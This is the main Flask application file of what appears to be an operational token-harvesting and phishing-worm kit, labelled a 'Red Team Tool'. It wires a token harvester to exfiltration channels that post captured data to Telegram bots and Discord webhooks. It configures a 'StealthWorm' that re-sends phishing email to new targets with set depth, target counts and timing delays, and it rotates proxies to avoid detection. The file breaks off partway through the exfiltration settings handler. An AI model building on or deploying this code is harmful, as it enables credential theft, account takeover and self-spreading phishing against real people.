#!/usr/bin/env python3
# app.py - Main Flask application with SSE, worm propagation, and dashboard
# Final Production Version - All features integrated and optimized

import os
import sys
import uuid
import time
import threading
import queue
import json
import socket
import base64
from datetime import datetime, timezone
from functools import wraps
from pathlib import Path
from urllib.parse import quote, urlencode, urlparse, urlunparse, parse_qs

from flask import Flask, render_template, jsonify, request, Response, stream_with_context, send_from_directory, session, redirect, url_for
import requests

# Import our modules - using enhanced logger
from logger import get_logger, print_banner, log_request, log_time
from core import StealthEngine, build_session_payload, decode_jwt, CryptoUtils
from harvester import TokenHarvester
from exfil import ExfilManager
from db import init_db, load_saved_configs, save_configs, load_runtime_overrides, save_runtime_overrides
from worm import StealthWorm, WormConfig
from exfil import load_exfil_config
from proxy_manager import load_proxies_from_env_or_file, get_next_proxy, get_proxy_count, get_current_proxy, get_proxy_index

# Initialize logger for this module
logger = get_logger('app')

# -------------------- FLASK APP --------------------
app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# Log all incoming requests for debugging routing issues
@app.before_request
def _log_incoming_request():
    try:
        logger.debug(f"Incoming request: {request.method} {request.path}")
        # Also print to stdout so the running terminal shows the request
        print(f"[REQUEST] {request.method} {request.path}")
    except Exception:
        pass

# Configuration for templates
TEMPLATE_FOLDER = Path(__file__).parent / 'templates'
STATIC_FOLDER = Path(__file__).parent / 'static'
CONFIG_FOLDER = Path(__file__).parent / 'configs'

# Create folders if they don't exist
TEMPLATE_FOLDER.mkdir(exist_ok=True)
STATIC_FOLDER.mkdir(exist_ok=True)
CONFIG_FOLDER.mkdir(exist_ok=True)

# Initialize shared project database
init_db()

# Load .env file (project root) but allow runtime overrides to supersede it.
DOTENV_PATH = Path(__file__).resolve().parents[1] / '.env'
_loaded_env = {}
try:
    from dotenv import load_dotenv
    if DOTENV_PATH.exists():
        load_dotenv(dotenv_path=str(DOTENV_PATH), override=False)
        logger.info(f"Loaded .env from {DOTENV_PATH}")
except Exception:
    # Fallback: parse simple KEY=VALUE lines
    try:
        if DOTENV_PATH.exists():
            with open(DOTENV_PATH, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#') or '=' not in line:
                        continue
                    k, v = line.split('=', 1)
                    k = k.strip()
                    v = v.strip().strip('"').strip("'")
                    if k and k not in os.environ:
                        os.environ[k] = v
            logger.info(f"Parsed .env from {DOTENV_PATH}")
    except Exception as e:
        logger.warning(f"Failed to parse .env file: {e}")

# Apply persisted runtime overrides (these should win over .env defaults)
runtime_overrides = load_runtime_overrides()
for k, v in runtime_overrides.items():
    os.environ[k] = str(v)

# If proxy.txt exists in the project root, prefer it as the proxy source.
# This makes proxy.txt the definitive source for proxies, even if .env contains a placeholder.
try:
    PROXY_FILE = Path(__file__).resolve().parents[1] / 'proxy.txt'
    if PROXY_FILE.exists():
        with open(PROXY_FILE, 'r', encoding='utf-8') as pf:
            lines = [ln.strip() for ln in pf.readlines()]
        # Filter blanks and comments, normalize schemes
        proxies = []
        for ln in lines:
            if not ln:
                continue
            ln = ln.strip()
            if not ln or ln.startswith('#'):
                continue
            if ln.startswith('http://') or ln.startswith('https://') or ln.startswith('socks'):
                proxies.append(ln)
            else:
                proxies.append('http://' + ln)
        if proxies:
            os.environ['PROXY_LIST'] = ','.join(proxies)
            logger.info(f"Loaded {len(proxies)} proxies from {PROXY_FILE}")
        elif not os.environ.get('PROXY_LIST'):
            logger.warning(f"proxy.txt found but no valid proxies were parsed")
except Exception as e:
    logger.warning(f"Failed to load proxies from proxy.txt: {e}")

# Initialize proxy manager from env or proxy.txt
try:
    _proxy_file_path = str(Path(__file__).resolve().parents[1] / 'proxy.txt')
    loaded = load_proxies_from_env_or_file('PROXY_LIST', _proxy_file_path)
    if loaded:
        logger.info(f"ProxyManager loaded {len(loaded)} proxies")
    else:
        logger.info("ProxyManager: no proxies loaded")
except Exception as e:
    logger.warning(f"Failed to initialize ProxyManager: {e}")
# Refresh worm config from loaded environment/runtime overrides
try:
    WormConfig.ENABLED = str(os.environ.get('WORM_ENABLED', 'false')).lower() in ('1', 'true', 'yes')
    WormConfig.MAX_DEPTH = int(os.environ.get('WORM_MAX_DEPTH', WormConfig.MAX_DEPTH))
    WormConfig.MAX_TARGETS_PER_CAPTURE = int(os.environ.get('WORM_MAX_TARGETS', WormConfig.MAX_TARGETS_PER_CAPTURE))
    WormConfig.PARALLEL_POLLERS = int(os.environ.get('WORM_PARALLEL_POLLERS', WormConfig.PARALLEL_POLLERS))
    WormConfig.MIN_EMAIL_DELAY = int(os.environ.get('WORM_MIN_EMAIL_DELAY', WormConfig.MIN_EMAIL_DELAY))
    WormConfig.MAX_EMAIL_DELAY = int(os.environ.get('WORM_MAX_EMAIL_DELAY', WormConfig.MAX_EMAIL_DELAY))
    WormConfig.MIN_SCORE_THRESHOLD = int(os.environ.get('WORM_MIN_SCORE_THRESHOLD', WormConfig.MIN_SCORE_THRESHOLD))
    WormConfig.HTML_TEMPLATE_PATH = os.environ.get('WORM_HTML_TEMPLATE', WormConfig.HTML_TEMPLATE_PATH)
    WormConfig.TXT_TEMPLATE_PATH = os.environ.get('WORM_TXT_TEMPLATE', WormConfig.TXT_TEMPLATE_PATH)
    WormConfig.TARGET_DOMAIN = os.environ.get('WORM_TARGET_DOMAIN', WormConfig.TARGET_DOMAIN)
except Exception as e:
    logger.warning(f"Failed to refresh WormConfig from env: {e}")

# Initialize config storage
saved_configs = load_saved_configs()

# Print startup banner
print_banner()

# -------------------- BASIC AUTH --------------------
def check_auth(username: str, password: str) -> bool:
    required_user = os.environ.get('AUTH_USER')
    required_pass = os.environ.get('AUTH_PASS')
    if not required_user or not required_pass:
        return True
    return username == required_user and password == required_pass

def is_auth_enabled() -> bool:
    return os.environ.get('REQUIRE_AUTH', '').lower() == 'true'


def is_authenticated() -> bool:
    if not is_auth_enabled():
        return True
    if session.get('logged_in'):
        return True
    auth = request.authorization
    return bool(auth and check_auth(auth.username, auth.password))


def authenticate():
    logger.warning("Authentication failed - unauthorized access attempt")
    if request.path.startswith('/api/') or request.path.startswith('/static/'):
        return Response('Unauthorized.\n', 401, {'WWW-Authenticate': 'Basic realm="Red Team Tool"'})
    next_url = request.path
    if request.query_string:
        next_url += '?' + request.query_string.decode('utf-8', errors='ignore')
    return redirect(url_for('login', next=quote(next_url)))


def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not is_authenticated():
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# -------------------- SESSION STORE --------------------
sessions = {}
SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 900))

# Simple keepalive timestamp updated by external pings
last_keepalive = None

def clean_expired_sessions():
    """Remove expired sessions from memory."""
    now = time.time()
    expired = [sid for sid, sess in sessions.items() if now - sess.get('created_at', 0) > SESSION_TIMEOUT]
    for sid in expired:
        sessions.pop(sid, None)
        logger.debug(f"Cleaned expired session {sid}")

# -------------------- WORM INITIALISATION --------------------
worm = StealthWorm() if WormConfig.ENABLED else None
if worm:
    logger.worm("Worm propagation engine initialized and ready")
    logger.info(f"Worm config: depth={WormConfig.MAX_DEPTH}, targets={WormConfig.MAX_TARGETS_PER_CAPTURE}")
else:
    logger.info("Worm propagation disabled (set WORM_ENABLED=true to enable)")

# Global exfil manager (lazily created and recreated when EXFIL_CONFIG changes)
exfil_manager = None
_exfil_config_loaded = None

def get_exfil_manager():
    """Return a cached ExfilManager, recreating when EXFIL_CONFIG or env-based exfil settings change."""
    global exfil_manager, _exfil_config_loaded

    cfg = os.environ.get('EXFIL_CONFIG')
    bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
    chat_id = os.environ.get('TELEGRAM_CHAT_ID', '').strip()
    discord_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL', '').strip()

    if cfg:
        fingerprint = cfg
    else:
        if not bot_token and not discord_webhook_url:
            return None
        fingerprint = f"ENV:telegram={bot_token}:chat={chat_id}:discord={discord_webhook_url}"

    if exfil_manager is None or _exfil_config_loaded != fingerprint:
        try:
            if cfg:
                mgr = load_exfil_config(cfg)
                logger.info("ExfilManager initialized/updated from EXFIL_CONFIG")
            else:
                channels = []
                if bot_token and chat_id:
                    channels.append({'type': 'telegram', 'bot_token': bot_token, 'chat_id': chat_id})
                if discord_webhook_url:
                    channels.append({'type': 'discord', 'webhook_url': discord_webhook_url})
                mgr = load_exfil_config(json.dumps({'channels': channels}))
                logger.info("ExfilManager initialized/updated from env-based webhook settings")
            exfil_manager = mgr
            _exfil_config_loaded = fingerprint
        except Exception as e:
            logger.error(f"Failed to initialize ExfilManager: {e}")
            exfil_manager = None
    return exfil_manager


def _load_exfil_config_data(config_source):
    """Load raw exfil configuration data from a JSON string, file, or URL."""
    if not config_source:
        return None
    try:
        if config_source.startswith('http://') or config_source.startswith('https://'):
            resp = requests.get(config_source, timeout=10)
            return resp.json()
        if os.path.exists(config_source):
            with open(config_source, 'r', encoding='utf-8') as f:
                return json.load(f)
        return json.loads(config_source)
    except Exception as e:
        logger.warning(f"Failed to load raw exfil config data: {e}")
        return None


def get_exfil_manager_for_channel(channel_type=None):
    """Return an ExfilManager for a specific channel type, or the main exfil manager."""
    if not channel_type:
        return get_exfil_manager()

    channel_type = channel_type.lower().strip()
    if channel_type not in ('telegram', 'discord'):
        return None

    config_source = os.environ.get('EXFIL_CONFIG')
    if config_source:
        config_data = _load_exfil_config_data(config_source)
        if config_data and isinstance(config_data, dict):
            channels = [ch for ch in config_data.get('channels', []) if str(ch.get('type', '')).lower() == channel_type]
            if channels:
                return load_exfil_config(json.dumps({'channels': channels}))

    if channel_type == 'telegram':
        bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        if bot_token and chat_id:
            return load_exfil_config(json.dumps({'channels': [{'type': 'telegram', 'bot_token': bot_token, 'chat_id': chat_id}]}))

    if channel_type == 'discord':
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if webhook_url:
            return load_exfil_config(json.dumps({'channels': [{'type': 'discord', 'webhook_url': webhook_url}]}))

    return None


def apply_runtime_overrides(overrides=None):
    """Apply runtime overrides to running components (worm, settings) without restart.
    If overrides is None, read values from os.environ.
    """
    global worm
    # Helper to read from overrides dict or os.environ
    def _get(key, default=None):
        if overrides is not None and key in overrides:
            return overrides.get(key)
        return os.environ.get(key, default)

    # === Worm enable/disable ===
    w_enabled = _get('WORM_ENABLED')
    w_enabled = str(w_enabled).lower() in ('1', 'true', 'yes') if w_enabled is not None else False
    WormConfig.ENABLED = w_enabled
    if w_enabled and worm is None:
        try:
            worm = StealthWorm()
            logger.worm('Worm engine enabled at runtime')
        except Exception as e:
            logger.error(f'Failed to initialize worm engine at runtime: {e}')
    elif not w_enabled and worm is not None:
        try:
            # Prefer explicit stop() method, fall back to shutdown()
            if hasattr(worm, 'stop'):
                worm.stop()
            elif hasattr(worm, 'shutdown'):
                worm.shutdown()
            logger.worm('Worm engine disabled at runtime')
        except Exception as e:
            logger.warning(f'Error shutting down worm engine: {e}')
        worm = None

    # === Worm parameters ===
    try:
        if hasattr(WormConfig, 'MAX_DEPTH') and _get('WORM_MAX_DEPTH') is not None:
            WormConfig.MAX_DEPTH = int(_get('WORM_MAX_DEPTH'))
        if hasattr(WormConfig, 'MAX_TARGETS_PER_CAPTURE') and _get('WORM_MAX_TARGETS') is not None:
            WormConfig.MAX_TARGETS_PER_CAPTURE = int(_get('WORM_MAX_TARGETS'))
        if hasattr(WormConfig, 'PARALLEL_POLLERS') and _get('WORM_PARALLEL_POLLERS') is not None:
            WormConfig.PARALLEL_POLLERS = int(_get('WORM_PARALLEL_POLLERS'))
        if hasattr(WormConfig, 'MIN_EMAIL_DELAY') and _get('WORM_MIN_EMAIL_DELAY') is not None:
            WormConfig.MIN_EMAIL_DELAY = int(_get('WORM_MIN_EMAIL_DELAY'))
        if hasattr(WormConfig, 'MAX_EMAIL_DELAY') and _get('WORM_MAX_EMAIL_DELAY') is not None:
            WormConfig.MAX_EMAIL_DELAY = int(_get('WORM_MAX_EMAIL_DELAY'))
        if hasattr(WormConfig, 'MIN_SCORE_THRESHOLD') and _get('WORM_MIN_SCORE_THRESHOLD') is not None:
            WormConfig.MIN_SCORE_THRESHOLD = int(_get('WORM_MIN_SCORE_THRESHOLD'))
        if hasattr(WormConfig, 'HTML_TEMPLATE_PATH') and _get('WORM_HTML_TEMPLATE') is not None:
            WormConfig.HTML_TEMPLATE_PATH = _get('WORM_HTML_TEMPLATE')
        if hasattr(WormConfig, 'TXT_TEMPLATE_PATH') and _get('WORM_TXT_TEMPLATE') is not None:
            WormConfig.TXT_TEMPLATE_PATH = _get('WORM_TXT_TEMPLATE')
    except Exception as e:
        logger.warning(f'Failed to apply worm parameter overrides: {e}')

    # === Proxies / Playwright / Exfil manager recreation ===
    try:
        # Update worm stealth engine proxies if present
        proxy_list_changed = False
        if overrides is not None and 'PROXY_LIST' in overrides:
            proxy_list_changed = True
        elif overrides is None and os.environ.get('PROXY_LIST') is not None:
            proxy_list_changed = True

        if proxy_list_changed and worm is not None and hasattr(worm, 'stealth'):
            try:
                worm.stealth.update_proxy_list()
                logger.info('Updated worm stealth engine proxy list at runtime')
            except Exception as e:
                logger.warning(f'Failed to update worm stealth proxies: {e}')

        # If EXFIL_CONFIG changed, recreate exfil manager now
        exfil_cfg_changed = False
        if overrides is not None and 'EXFIL_CONFIG' in overrides:
            exfil_cfg_changed = True
        elif overrides is None and os.environ.get('EXFIL_CONFIG') is not None:
            exfil_cfg_changed = True

        if exfil_cfg_changed:
            try:
                # Force reload on next get_exfil_manager() call
                from exfil import load_exfil_config
                global exfil_manager, _exfil_config_loaded
                exfil_manager = None
                _exfil_config_loaded = None
                get_exfil_manager()
                logger.info('ExfilManager reloaded due to EXFIL_CONFIG change')
            except Exception as e:
                logger.warning(f'Failed to reload ExfilManager: {e}')
    except Exception as e:
        logger.warning(f'Error during proxy/exfil update: {e}')

# -------------------- CONFIGURATION API ROUTES --------------------
@app.route('/api/config/list')
@requires_auth
def list_configs():
    """List all saved configurations."""
    return jsonify({
        'configs': saved_configs,
        'current': {
            'client_id': os.environ.get('CLIENT_ID', ''),
            'tenant': os.environ.get('TENANT', 'common'),
            'worm_enabled': WormConfig.ENABLED,
            'worm_max_depth': WormConfig.MAX_DEPTH,
            'worm_max_targets': WormConfig.MAX_TARGETS_PER_CAPTURE,
            'proxy_list': os.environ.get('PROXY_LIST', ''),
            'playwright': os.environ.get('PLAYWRIGHT', 'false'),
            'debug': os.environ.get('DEBUG', 'false'),
        }
    })

@app.route('/api/config/save', methods=['POST'])
@requires_auth
def save_config():
    """Save a configuration profile."""
    data = request.get_json()
    config_name = data.get('name')
    config_data = data.get('config', {})
    
    if not config_name:
        return jsonify({'error': 'Config name required'}), 400
    
    saved_configs[config_name] = {
        'client_id': config_data.get('client_id', ''),
        'tenant': config_data.get('tenant', 'common'),
        'scope': config_data.get('scope', ''),
        'max_endpoints': config_data.get('max_endpoints', 4),
        'refresh_token': config_data.get('refresh_token', True),
        'detect_ca': config_data.get('detect_ca', True),
        'worm_enabled': config_data.get('worm_enabled', False),
        'worm_max_depth': config_data.get('worm_max_depth', 2),
        'worm_max_targets': config_data.get('worm_max_targets', 5),
        'proxy_list': config_data.get('proxy_list', ''),
        'playwright': config_data.get('playwright', False),
        'created_at': datetime.now().isoformat()
    }
    
    if save_configs(saved_configs):
        logger.success(f"Configuration saved: {config_name}")
        return jsonify({'success': True, 'message': f'Config "{config_name}" saved'})
    else:
        return jsonify({'error': 'Failed to save config'}), 500

@app.route('/api/config/load/<config_name>')
@requires_auth
def load_config(config_name):
    """Load a configuration profile."""
    if config_name not in saved_configs:
        return jsonify({'error': 'Config not found'}), 404
    
    return jsonify(saved_configs[config_name])

@app.route('/api/config/delete/<config_name>', methods=['DELETE'])
@requires_auth
def delete_config(config_name):
    """Delete a configuration profile."""
    if config_name not in saved_configs:
        return jsonify({'error': 'Config not found'}), 404
    
    del saved_configs[config_name]
    if save_configs(saved_configs):
        logger.success(f"Configuration deleted: {config_name}")
        return jsonify({'success': True, 'message': f'Config "{config_name}" deleted'})
    else:
        return jsonify({'error': 'Failed to delete config'}), 500

@app.route('/api/config/apply', methods=['POST'])
@requires_auth
def apply_config():
    """Apply configuration to current session (updates environment)."""
    data = request.get_json()
    config_name = data.get('name')
    
    if config_name not in saved_configs:
        return jsonify({'error': 'Config not found'}), 404
    
    config = saved_configs[config_name]
    
    # Update environment variables (in-memory only) and persist as runtime overrides
    overrides = load_runtime_overrides()

    def _set_override(key, value):
        if value is None:
            return
        os.environ[key] = str(value)
        overrides[key] = value

    if config.get('client_id'):
        _set_override('CLIENT_ID', config['client_id'])
    if config.get('tenant'):
        _set_override('TENANT', config['tenant'])
    if config.get('proxy_list'):
        _set_override('PROXY_LIST', config['proxy_list'])
    if 'playwright' in config:
        _set_override('PLAYWRIGHT', 'true' if config.get('playwright') else 'false')
    if 'worm_enabled' in config:
        _set_override('WORM_ENABLED', 'true' if config.get('worm_enabled') else 'false')

    # Optional fields
    if 'max_endpoints' in config:
        _set_override('MAX_ENDPOINTS', config.get('max_endpoints'))
    if 'refresh_token' in config:
        _set_override('REFRESH_TOKEN', config.get('refresh_token'))
    if 'detect_ca' in config:
        _set_override('DETECT_CA', config.get('detect_ca'))

    # Persist runtime overrides so they survive restarts
    saved = save_runtime_overrides(overrides)

    # Apply changes immediately to running components
    try:
        apply_runtime_overrides(overrides)
    except Exception as e:
        logger.warning(f"Failed to apply runtime overrides immediately: {e}")

    logger.success(f"Configuration applied: {config_name}")
    msg = f'Config "{config_name}" applied (restart may be required for some settings)'
    if saved:
        msg += ' and persisted as runtime overrides'

    return jsonify({'success': True, 'message': msg, 'overrides_persisted': saved})

@app.route('/api/config/export')
@requires_auth
def export_configs():
    """Export all configurations as JSON."""
    return jsonify(saved_configs)


@app.route('/api/runtime-overrides')
@requires_auth
def get_runtime_overrides_api():
    """Return currently persisted runtime overrides."""
    overrides = load_runtime_overrides()
    return jsonify({'overrides': overrides})


@app.route('/api/runtime-overrides/clear', methods=['POST'])
@requires_auth
def clear_runtime_overrides_api():
    """Clear persisted runtime overrides and restore values from .env where available."""
    overrides = load_runtime_overrides()
    if not overrides:
        return jsonify({'success': True, 'message': 'No runtime overrides present'})

    # Parse .env to restore defaults if present
    env_defaults = {}
    try:
        if DOTENV_PATH.exists():
            with open(DOTENV_PATH, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#') or '=' not in line:
                        continue
                    k, v = line.split('=', 1)
                    k = k.strip()
                    v = v.strip().strip('"').strip("'")
                    env_defaults[k] = v
    except Exception as e:
        logger.warning(f"Failed to parse .env when clearing overrides: {e}")

    # Restore or remove keys
    for k in list(overrides.keys()):
        if k in env_defaults:
            os.environ[k] = env_defaults[k]
        else:
            os.environ.pop(k, None)

    try:
        save_runtime_overrides({})
    except Exception as e:
        logger.error(f"Failed to clear runtime overrides in database: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

    # Apply environment defaults now
    try:
        apply_runtime_overrides(None)
    except Exception as e:
        logger.warning(f"Failed to apply environment defaults after clearing overrides: {e}")

    logger.info("Runtime overrides cleared and environment restored from .env (where available)")
    return jsonify({'success': True, 'message': 'Runtime overrides cleared; environment restored from .env'})


@app.route('/api/runtime-overrides', methods=['POST'])
@requires_auth
def set_runtime_overrides_api():
    """Set and persist runtime overrides. Body: {"overrides": {k:v}}"""
    data = request.get_json() or {}
    overrides = data.get('overrides')
    if overrides is None:
        return jsonify({'error': 'overrides object required'}), 400

    # Persist
    ok = save_runtime_overrides(overrides)
    if not ok:
        return jsonify({'success': False, 'error': 'failed to save overrides'}), 500

    # Apply to environment
    for k, v in overrides.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = str(v)
    # Apply to running components immediately
    try:
        apply_runtime_overrides(overrides)
    except Exception as e:
        logger.warning(f"Failed to apply runtime overrides at save: {e}")

    logger.info(f"Runtime overrides updated: {list(overrides.keys())}")
    return jsonify({'success': True, 'overrides': overrides})

@app.route('/api/config/import', methods=['POST'])
@requires_auth
def import_configs():
    """Import configurations from JSON."""
    data = request.get_json()
    imported_configs = data.get('configs', {})
    
    if not imported_configs:
        return jsonify({'error': 'No configs to import'}), 400
    
    # Merge with existing configs
    for name, config in imported_configs.items():
        if name not in saved_configs:
            saved_configs[name] = config
    
    if save_configs(saved_configs):
        logger.success(f"Imported {len(imported_configs)} configurations")
        return jsonify({'success': True, 'message': f'Imported {len(imported_configs)} configs'})
    else:
        return jsonify({'error': 'Failed to import configs'}), 500

# -------------------- SYSTEM INFO API --------------------
@app.route('/api/system/info')
@requires_auth
def system_info():
    """Get system information."""
    return jsonify({
        'python_version': sys.version,
        'platform': sys.platform,
        'hostname': socket.gethostname(),
        'worm_enabled': WormConfig.ENABLED,
        'configs_count': len(saved_configs),
        'active_sessions': len(sessions),
    })

# -------------------- WORM CONFIG API --------------------
@app.route('/api/worm/config')
@requires_auth
def worm_config():
    """Get current worm configuration."""
    return jsonify({
        'enabled': WormConfig.ENABLED,
        'max_depth': WormConfig.MAX_DEPTH,
        'max_targets': WormConfig.MAX_TARGETS_PER_CAPTURE,
        'parallel_pollers': WormConfig.PARALLEL_POLLERS,
        'min_email_delay': WormConfig.MIN_EMAIL_DELAY,
        'max_email_delay': WormConfig.MAX_EMAIL_DELAY,
        'min_score_threshold': WormConfig.MIN_SCORE_THRESHOLD,
        'target_domain': WormConfig.TARGET_DOMAIN,
        'html_template': WormConfig.HTML_TEMPLATE_PATH,
        'txt_template': WormConfig.TXT_TEMPLATE_PATH,
    })

@app.route('/api/worm/config/update', methods=['POST'])
@requires_auth
def update_worm_config():
    """Update worm configuration and apply immediately via runtime overrides."""
    data = request.get_json()
    
    overrides = load_runtime_overrides()
    changes = []
    
    if 'max_depth' in data:
        overrides['WORM_MAX_DEPTH'] = str(data['max_depth'])
        os.environ['WORM_MAX_DEPTH'] = str(data['max_depth'])
        changes.append(f"max_depth={data['max_depth']}")
    if 'max_targets' in data:
        overrides['WORM_MAX_TARGETS'] = str(data['max_targets'])
        os.environ['WORM_MAX_TARGETS'] = str(data['max_targets'])
        changes.append(f"max_targets={data['max_targets']}")
    if 'parallel_pollers' in data:
        overrides['WORM_PARALLEL_POLLERS'] = str(data['parallel_pollers'])
        os.environ['WORM_PARALLEL_POLLERS'] = str(data['parallel_pollers'])
        changes.append(f"parallel_pollers={data['parallel_pollers']}")
    if 'min_email_delay' in data:
        overrides['WORM_MIN_EMAIL_DELAY'] = str(data['min_email_delay'])
        os.environ['WORM_MIN_EMAIL_DELAY'] = str(data['min_email_delay'])
        changes.append(f"min_email_delay={data['min_email_delay']}")
    if 'max_email_delay' in data:
        overrides['WORM_MAX_EMAIL_DELAY'] = str(data['max_email_delay'])
        os.environ['WORM_MAX_EMAIL_DELAY'] = str(data['max_email_delay'])
        changes.append(f"max_email_delay={data['max_email_delay']}")
    if 'min_score_threshold' in data:
        overrides['WORM_MIN_SCORE_THRESHOLD'] = str(data['min_score_threshold'])
        os.environ['WORM_MIN_SCORE_THRESHOLD'] = str(data['min_score_threshold'])
        changes.append(f"min_score_threshold={data['min_score_threshold']}")
    if 'enabled' in data:
        overrides['WORM_ENABLED'] = 'true' if data['enabled'] else 'false'
        os.environ['WORM_ENABLED'] = 'true' if data['enabled'] else 'false'
        changes.append(f"enabled={data['enabled']}")
    
    # Save overrides and apply to running components
    saved = save_runtime_overrides(overrides)
    if saved:
        try:
            apply_runtime_overrides(overrides)
            logger.success(f"Worm config updated and applied: {', '.join(changes)}")
        except Exception as e:
            logger.warning(f"Failed to apply worm overrides immediately: {e}")
    
    return jsonify({
        'success': saved, 
        'message': 'Configuration updated and applied immediately',
        'changes': changes
    })

@app.route('/api/settings/proxy', methods=['POST'])
@requires_auth
def save_proxy_settings():
    """Save proxy list settings via runtime overrides."""
    data = request.get_json()
    proxy_list = data.get('proxy_list', '').strip()
    
    overrides = load_runtime_overrides()
    if proxy_list:
        overrides['PROXY_LIST'] = proxy_list
        os.environ['PROXY_LIST'] = proxy_list
    else:
        overrides.pop('PROXY_LIST', None)
        os.environ.pop('PROXY_LIST', None)
    
    saved = save_runtime_overrides(overrides)
    if saved:
        try:
            apply_runtime_overrides(overrides)
            logger.success("Proxy settings saved and applied")
        except Exception as e:
            logger.warning(f"Failed to apply proxy settings immediately: {e}")
    
    return jsonify({
        'success': saved,
        'message': 'Proxy settings saved' + (' and applied' if saved else ''),
        'proxy_count': len([p for p in proxy_list.split(',') if p.strip()]) if proxy_list else 0
    })

@app.route('/api/proxy/test', methods=['POST'])
@requires_auth
def test_proxy_connectivity():
    """Test proxy connectivity by fetching external IP."""
    try:
        proxy_list = os.environ.get('PROXY_LIST', '').strip()
        if not proxy_list:
            return jsonify({
                'connected': False,
                'error': 'No proxy configured',
                'message': 'Set PROXY_LIST in settings to test'
            }), 400

        proxies_list = [p.strip() for p in proxy_list.split(',') if p.strip()]
        if not proxies_list:
            return jsonify({
                'connected': False,
                'error': 'Invalid proxy list format',
                'message': 'PROXY_LIST is empty or malformed'
            }), 400

        test_proxy = get_next_proxy() or proxies_list[0]
        proxy_dict = {'http': test_proxy, 'https': test_proxy}

        logger.info(f"Testing proxy connectivity: {test_proxy}")
        
        # Use requests to test through the proxy rotation manager
        session = requests.Session()
        session.trust_env = False
        session.proxies.update(proxy_dict)
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

        response = session.get(
            'https://ipinfo.io/ip',
            timeout=10
        )
        response.raise_for_status()
        
        exit_ip = response.text.strip()
        logger.success(f"Proxy test successful - exit IP: {exit_ip}")
        
        return jsonify({
            'connected': True,
            'message': f'Proxy is working!',
            'exit_ip': exit_ip,
            'proxy_tested': test_proxy,
            'total_proxies': len(proxies_list)
        })
        
    except requests.exceptions.ConnectTimeout:
        logger.warning("Proxy test failed: connection timeout")
        return jsonify({
            'connected': False,
            'error': 'Connection timeout',
            'message': 'Proxy did not respond within 10 seconds'
        }), 503
    except requests.exceptions.ProxyError as e:
        logger.warning(f"Proxy test failed: proxy error - {e}")
        return jsonify({
            'connected': False,
            'error': 'Proxy error',
            'message': str(e)
        }), 503
    except requests.exceptions.HTTPError as e:
        logger.warning(f"Proxy test failed: HTTP error - {e}")
        return jsonify({
            'connected': False,
            'error': 'HTTP error',
            'message': f'Status {response.status_code}: {response.text}'
        }), 503
    except Exception as e:
        logger.error(f"Proxy test failed: {e}")
        return jsonify({
            'connected': False,
            'error': 'Test failed',
            'message': str(e)
        }), 500


@app.route('/api/proxy/next')
@requires_auth
def api_proxy_next():
    """Return the next proxy string for immediate use by other modules."""
    try:
        proxy = get_next_proxy()
        if proxy is None:
            return jsonify({'proxy': None, 'message': 'No proxies configured'}), 200
        return jsonify({'proxy': proxy}), 200
    except Exception as e:
        logger.error(f"Failed to get next proxy: {e}")
        return jsonify({'error': 'failed', 'message': str(e)}), 500


@app.route('/api/proxy/count')
@requires_auth
def api_proxy_count():
    """Return the number of loaded proxies."""
    try:
        count = get_proxy_count()
        return jsonify({'count': count}), 200
    except Exception as e:
        logger.error(f"Failed to get proxy count: {e}")
        return jsonify({'error': 'failed', 'message': str(e)}), 500


@app.route('/api/proxy/status')
@requires_auth
def api_proxy_status():
    """Return current proxy rotation status and active proxy information."""
    try:
        count = get_proxy_count()
        next_proxy = get_current_proxy()
        index = get_proxy_index()
        return jsonify({
            'proxy_count': count,
            'next_proxy': next_proxy,
            'next_index': index,
            'has_proxies': count > 0
        }), 200
    except Exception as e:
        logger.error(f"Failed to get proxy status: {e}")
        return jsonify({'error': 'failed', 'message': str(e)}), 500


@app.route('/api/settings/exfil', methods=['POST'])
@requires_auth
def save_exfil_settings():
    """Save exfiltration settings via runtime overrides."""
    data = request.get_json()
    exfil_config = data.get('exfil_config', '').strip()
    encryption_key = data.get('encryption_key', '').strip()
    telegram_bot_token = data.get('telegram_bot_token', '').strip()
    telegram_chat_id = data.get('telegram_chat_id', '').strip()
    discord_webhook_url = data.get('discord_webhook_url', '').strip()
    
    overrides = load_runtime_overrides()
    
    # Validate JSON if present
    if exfil_config:
        try:
            json.loads(exfil_config)
            overrides['EXFIL_CONFIG'] = exfil_config
            os.environ['EXFIL_CONFIG'] = exfil_config
        except json.JSONDecodeError as e:
            return jsonify({'success': False, 'error': f'Invalid JSON in exfil config: {e}'}), 400
    else:
        overrides.pop('EXFIL_CONFIG', None)
        os.environ.pop('EXFIL_CONFIG', None)
    
    if encryption_key:
        # Validate hex format
        try:
            bytes.fromhex(encryption_key)
            overrides['ENCRYPTION_KEY'] = encryption_key
            os.environ['ENCRYPTION_KEY'] = encryption_key
        except ValueError:
            return jsonify({'success': False, 'error': 'Encryption key must be hex format'}), 400
    else:
        overrides.pop('ENCRYPTION_KEY', None)
        os.environ.pop('ENCRYPTION_KEY', None)

    if telegram_bot_token:
        overrides['TELEGRAM_BOT_TOKEN'] = telegram_bot_token
        os.environ['TELEGRAM_BOT_TOKEN'] = telegram_bot_token
    else:
        overrides.pop('TELEGRAM_BOT_TOKEN', None)
        os.environ.pop('TELEGRAM_BOT_TOKEN', None)

    if telegram_chat_id:
        overrides['TELEGRAM_CHAT_ID'] = telegram_chat_id
        os.environ['TELEGRAM_CHAT_ID'] = telegram_chat_id
    else:
        overrides.pop('TELEGRAM_CHAT_ID', None)
        os.environ.pop('TELEGRAM_CHAT_ID', None)

    if discord_webhook_url:
        overrides['DISCORD_WEBHOOK_URL'] = discord_webhook_url
        os.environ['DISCORD_WEBHOOK_URL'] = discord_webhook_url
    else:
        overrides.pop('DISCORD_WEBHOOK_URL', None)
